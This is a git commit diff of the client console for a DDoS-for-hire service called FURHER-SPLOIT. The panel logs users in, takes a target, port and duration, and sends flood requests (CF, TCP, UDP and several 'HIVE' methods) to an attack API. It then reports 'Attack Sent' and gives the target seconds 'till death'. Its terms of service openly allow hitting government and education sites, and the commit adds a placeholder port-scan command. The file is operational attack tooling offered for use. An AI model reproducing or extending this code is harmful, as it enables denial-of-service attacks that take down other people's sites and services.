9544cbafeec053865ccf555aba4b03197d98a5b0
ACKER POSIDEN <94275268+dev17V@users.noreply.github.com>
2024-02-29 18:36:38 -0600

    Update FURHER-PANEL.js

--- FURHER-NODE-ATTACK-API-MAIN/Nodejs-Attack-Api-main/FURHER-CLIENT-PANEL/FURHER-PANEL.js
+++ FURHER-NODE-ATTACK-API-MAIN/Nodejs-Attack-Api-main/FURHER-CLIENT-PANEL/FURHER-PANEL.js
@@ -1,6 +1,5 @@
 const readline = require('readline');
 const axios = require('axios');
-const { request } = require('http');
 const { response } = require('express');
 const fs = require('fs').promises;
 
@@ -8,17 +7,33 @@ function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-let validCommands = ['.cf', '.tcp', '.udp', 'methods', 'logout', 'info', 'tos', 'iplookup', 'help', '?'];
+const rs = response;
+
+var cmd = '';
+
+function smallCase(input) {
+  return input.toLowerCase();
+}
+
+let myCmds = ['.cf', '.tcp', '.udp', 'methods', 'logout', 'info', 'tos', 'iplookup', 'help', '?', 'portscan'];
 
 let methodsBanner = `
 \x1b[2J\x1b[1H\x1b[0m
-╔════════════╦═════════════════╦════════════════════════════════════════╗
-║   METHOD   ║       ARGS      ║                                        ║
-╠════════════╬═════════════════╬════════════════════════════════════════╣
-║    .CF     ║  URL PORT TIME  ║                                        ║
-║    .TCP    ║  IP  PORT TIME  ║                                        ║
-║    .UDP    ║  IP  PORT TIME  ║                                        ║
-╚════════════╩═════════════════╩════════════════════════════════════════╝\n
+      ╔═══════════════╦════════════════════════╦═══════════════════════════════════════╗
+      ║   METHOD      ║      ATTACK ARGS       ║              METHOD INFO              ║
+      ╠═══════════════╬════════════════════════╬═══════════════════════════════════════╣
+      ║    .CF        ║  URL PORT TIME         ║     Used For CF With No Rules         ║
+      ║    .TCP       ║  IP  PORT TIME         ║     Used For basic VPN's [TCP-ONLY]   ║
+      ║ .HIVE-HOME    ║  IP  PORT TIME         ║     Used For Homes dedicated 5 GBPS   ║
+      ║ .HIVE-FORT    ║  IP  PORT TIME         ║                                       ║
+      ║ .HIVE-FP-TCP  ║  IP  PORT TIME         ║                                       ║
+      ║ .HIVE-FP-UDP  ║  IP  PORT TIME         ║                                       ║
+      ║ .HIVE-HTTP    ║  URL PORT TIME         ║                                       ║
+      ║ .HIVE-HTTPS   ║  URL PORT TIME         ║                                       ║
+      ║ .HIVE-L4DS    ║  IP  PORT TIME         ║                                       ║
+      ║ .HIVE-L7DS    ║  URL PORT TIME         ║                                       ║
+      ║ .HIVE-PROX-CF ║  URL PORT TIME THREADS ║                                       ║
+      ╚═══════════════╩════════════════════════╩═══════════════════════════════════════╝\n
 `;
 
 //║             ║                 ║                                        ║ //line for later if needed
@@ -35,20 +50,21 @@ const displayFurher = `
 `;
 
 const furher_tos = `
-  [ ToS & User Rules ]
-    │ 1: [If you can find an unblacklisted Dstat, feel free to use it.]
-    │ 2: [You may not try to bypass the specifications of your user account in any way, shape, or form.]
-    │ 3: [You can be banned for any reason deemed necessary by Gorillas staff team.]
-    │ 4: [Do not directly badmouth FURHER-SPLOIT staff. Honesty is appreciated, but don't be disrespectful.]
-    │ 5: [You may hit government sites, including ".gov", ".edu", or other government TLDs]
-    │ 6: [Contact FURHER-SPLOIT staff if you need assistance]
-    │ 7: [You MAY NOT Share your Login without EXPLICIT Permission from FURHER-SPLOIT staff.]
-    │ 8: [You MAY NOT promote your own services power while showcasing FURHER-SPLOIT power.]
-    │ 9: [You MAY NOT knowingly misrepresent FURHER-SPLOIT or any related services.]
+    [ ToS & User Rules ]
+      │ 1: [If you can find an unblacklisted Dstat, feel free to use it.]
+      │ 2: [You may not try to bypass the specifications of your user account in any way, shape, or form.]
+      │ 3: [You can be banned for any reason deemed necessary by Gorillas staff team.]
+      │ 4: [Do not directly badmouth FURHER-SPLOIT staff. Honesty is appreciated, but don't be disrespectful.]
+      │ 5: [You may hit government sites, including ".gov", ".edu", or other government TLDs]
+      │ 6: [Contact FURHER-SPLOIT staff if you need assistance]
+      │ 7: [You MAY NOT Share your Login without EXPLICIT Permission from FURHER-SPLOIT staff.]
+      │ 8: [You MAY NOT promote your own services power while showcasing FURHER-SPLOIT power.]
+      │ 9: [You MAY NOT knowingly misrepresent FURHER-SPLOIT or any related services.]
 `;
 
 const rl = readline.createInterface({
-  input: process.stdin
+  input: process.stdin,
+  output: process.stdout
 });
 
 function clearConsole() {
@@ -62,12 +78,12 @@ function clearConsole() {
 
 function checkServerAuth(username, password, localHWID) {
   axios.get(`http://localhost:3000/auth?username=${username}&password=${password}&hwid=${localHWID}`)
-    .then(response => {
-      if (response.status !== 200) {
+    .then(rs => {
+      if (rs.status !== 200) {
         console.log("Authentication failed.");
         rl.close();
       }
-      token = response.data.success;
+      token = rs.data.success;
       usernames = username;
       takeUserInput();
     })
@@ -77,33 +93,32 @@ function checkServerAuth(username, password, localHWID) {
     });
 }
 
-function handleCommand(command) {
-  command = command.toLowerCase();
-  if (!validCommands.includes(command)) {
-    console.debug(command);
+function handleCommand(cmd) {
+  if (!myCmds.includes(cmd)) {
+    console.log(cmd.toLowerCase());
     console.log('[x] Invalid command');
     sleep(1000).then(() => takeUserInput());
   } else {
-    switch (command) {
+    switch (cmd.toLowerCase()) { //whatever they put in gets converted to a lowercase string
       case '.cf':
       case '.tcp':
       case '.udp':
         rl.question('TARGET: ', (target) => {
           rl.question('PORT: ', (port) => {
             rl.question('TIME: ', (time) => {
-              axios.get(`http://${API_SERVER}:3000/api/fear/?key=${token}&target=${target}&port=${port}&time=${time}&method=${command}`)
-                .then(response => {
+              axios.get(`http://${API_SERVER}:3000/api/fear/?key=${token}&target=${target}&port=${port}&time=${time}&method=${cmd}`)
+                .then(rs => {
                   console.log(`
                   ╔══════════════════════╗
                   ╠═══╣Attack Sent╠══════╝
                   ║   Target: ${target}
                   ║   Port: ${port}        ╔════════════════╗
-                  ║   Time: ${time}      ╔═╣ API-STATUS:${response.data} ║
-                  ║   Method: ${command} ║ ╚════════════════╝
+                  ║   Time: ${time}      ╔═╣ API-STATUS: ${rs.status}║
+                  ║   Method: ${cmd}   ║ ╚════════════════╝
                   ╚══════════════════════╝
                   `);
                   console.log(`Give the target [${target}] 5 sec till death`);
-                  sleep(5000).then(() => takeUserInput());
+                  sleep(10000).then(() => takeUserInput());
                 })
                 .catch(error => {
                   console.error('Error:', error.message);
@@ -115,7 +130,7 @@ function handleCommand(command) {
         break;
       case 'methods':
         console.log(methodsBanner);
-        sleep(3000).then(() => takeUserInput());
+        sleep(10000).then(() => takeUserInput());
         break;
       case 'logout':
         console.log('Logging out. Goodbye!');
@@ -145,6 +160,10 @@ function handleCommand(command) {
         `);
         sleep(2000).then(() => takeUserInput());
         break;
+      case 'portscan':
+        clearConsole();
+        sleep(2000).then(() => portscan());
+        break;
       case null:
         console.log("OOPS DONT KNOW WHAT HAPPEND HERE");
         sleep(3000).then(() => takeUserInput());
@@ -157,8 +176,8 @@ function handleCommand(command) {
 function iplookup() {
   rl.question('IP TO LOOKUP: ', (target) => {
     axios.get(`https://ipinfo.io/${target}/json`)
-      .then(response => {
-        console.log(response.data);
+      .then(rs => {
+        console.log(rs.data);
         sleep(3000).then(() => takeUserInput());
       })
       .catch(error => {
@@ -167,17 +186,28 @@ function iplookup() {
   });
 }
 
+function portscan() {
+  
+  // rl.question('IP TO SCAN: '), (target) => {
+    
+  // }
+}
+
 function takeUserInput() {
   clearConsole();
   console.log(`${displayFurher}`);
-  process.stdout.write(`╔══◘\n╚══[${usernames}]═> `);
-  rl.question(`╔══◘\n╚══[${usernames}]═> `, (command) => {
-    if (command.includes(null)) {
+  rl.question(`╔══◘\n╚══[${usernames}]═> `, (cmd) => {
+    if (cmd === null || cmd.trim() === "") {
       takeUserInput();
-    } else if (command.includes(validCommands)) {
-      handleCommand(command, usernames);
     } else {
-      handleCommand(command, usernames);
+      smallCaseCmd = smallCase(cmd);
+      if (myCmds.includes(smallCaseCmd)) {
+        handleCommand(smallCaseCmd);
+      } else {
+        console.error(`[ ${cmd} ] Oops! Did You Think That Was A Command?`);
+        console.log("Let's try to see what you were typing.");
+        sleep(2000).then(() => handleCommand(smallCaseCmd)); // corrects what they were typing to lowercase string
+      }
     }
   });
 }
